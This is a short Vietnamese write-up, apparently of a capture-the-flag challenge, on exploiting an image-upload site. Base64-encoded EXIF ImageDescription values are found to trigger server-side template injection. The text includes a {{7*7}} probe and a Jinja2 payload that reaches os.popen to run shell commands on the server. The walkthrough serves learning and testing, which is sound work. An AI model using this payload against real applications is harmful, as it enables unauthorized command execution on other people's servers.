![image](https://github.com/user-attachments/assets/c85cd759-d817-4e71-9039-0ecf28b24b25)

Trang web có chức năng chính là upload ảnh gồm PNG hoặc JPG và giới hạn 5mb

![image](https://github.com/user-attachments/assets/a4474c4e-33e5-4392-8293-bb50853c539d)

Tôi sử dụng `exiftool tool -ImageDescription="hello" github.png ` để chỉnh Image Description có nội dung là hello

![image](https://github.com/user-attachments/assets/209e189e-850a-42be-96b7-39a7c230fb4f)

![image](https://github.com/user-attachments/assets/4f516762-9f7c-4510-aeee-8f782a8b5652)

Kết quả là "not valid Base64", tôi thử encoded theo base64 thì nó hiển thị được

![image](https://github.com/user-attachments/assets/d7b458ad-c5b8-4d40-bb17-521c24bd9a85)

Theo như tôi dự đoán thì có vẻ lỗi sẽ liên quan đến server side thay vì client side, tôi thử dùng {{7*7}}

![image](https://github.com/user-attachments/assets/0a122067-6fc9-4050-952d-52b94c67c980)

Và nó xuất hiện ssti, tôi sử dụng wappalyzer thì có xuất hiện là website sử dụng python, tôi xài tạm cái payload ssti và encode sang base64

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}`

![image](https://github.com/user-attachments/assets/d9227582-83f1-4133-95a3-1b55fac4ef51)

![image](https://github.com/user-attachments/assets/8b05bb60-2536-47a0-9fe7-b8911b077d51)
